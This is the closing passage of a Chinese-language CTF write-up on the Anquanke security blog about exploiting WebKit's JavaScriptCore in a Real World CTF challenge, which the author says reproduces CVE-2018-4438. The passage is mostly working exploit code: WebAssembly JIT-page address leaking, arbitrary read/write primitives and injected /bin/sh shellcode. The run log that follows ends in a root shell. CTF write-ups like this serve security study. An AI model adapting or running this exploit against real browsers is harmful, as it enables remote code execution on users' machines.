            var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
            var wasm_mod = new WebAssembly.Module(wasm_code);
            var wasm_instance = new WebAssembly.Instance(wasm_mod);
            var f = wasm_instance.exports.main;
            var addr_f = this.addrof(f);
            var addr_p = this.read64(addr_f + 0x48);
            var addr_shellcode = this.read64(addr_p);
            print(hex(addr_f))
            print(hex(addr_shellcode))
            shellcode = "j;Xx99RHxbb//bin/shST_RWT^x0fx05"
            this.write(addr_shellcode, shellcode);
            f();
        },
    
    };
    
    stage2.pwn()
    

###  运行效果

运行效果如下

    
    
    # ./jsc --useConcurrentJIT=false ./exp.js
    7fffb26d8810
    Object: 0x7fffb26e81e0 with butterfly (nil) (Structure 0x7fffb26709a0:[Object, {JSCell:0, butterfly:1}, NonArray, Proto:0x7fffb26d8000, Leaf]), StructureID: 38722
    -----    Object: 0x7fffb261be40 with butterfly 0x7fe01c1e0f28 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010]), StructureID: 31151
    Object: 0x7fffb261be50 with butterfly 0x7fe01c1e0f48 (Structure 0x7fffb26f1dc0:[Array, {}, ArrayWithContiguous, Proto:0x7fffb26d8010]), StructureID: 31267
    -----    Object: 0x7fffb261be40 with butterfly 0x7fe01c1e0f28 (Structure 0x7fffb26f1d50:[Array, {}, ArrayWithDouble, Proto:0x7fffb26d8010]), StructureID: 31151
    Object: 0x7fffb261be50 with butterfly 0x7fe01c1e0f28 (Structure 0x7fffb26f1dc0:[Array, {}, ArrayWithContiguous, Proto:0x7fffb26d8010]), StructureID: 31267
    7ffff2ad6bc8
    7fffb2a05c00
    # id
    uid=0(root) gid=0(root) groups=0(root)
    #
    

## 小结

jsc 层基本上就是把`lokihardt` 的`CVE-2018-4438` 复现了一遍，后半部分沙箱逃逸也是造了个洞，木有办法复现有点可惜
:(，具体可以参考[官方的writeup](https://zhuanlan.zhihu.com/p/96069221)

## reference

<https://zhuanlan.zhihu.com/p/96069221>

<https://github.com/vngkv123/aSiagaming/tree/master/Safari-JSC-FastStructureCache>

<https://github.com/5lipper/ctf/tree/master/rwctf19-final/FastStructureCache>

<https://bugs.chromium.org/p/project-zero/issues/detail?id=1649>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **rtfingc** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/204331](/post/id/204331)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [RealWorld](/tag/RealWorld)
  * [WebKit](/tag/WebKit)

 **+1** __3赞

 __收藏

![](https://p1.ssl.qhimg.com/t0194acf280719427c3.png) rtfingc

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

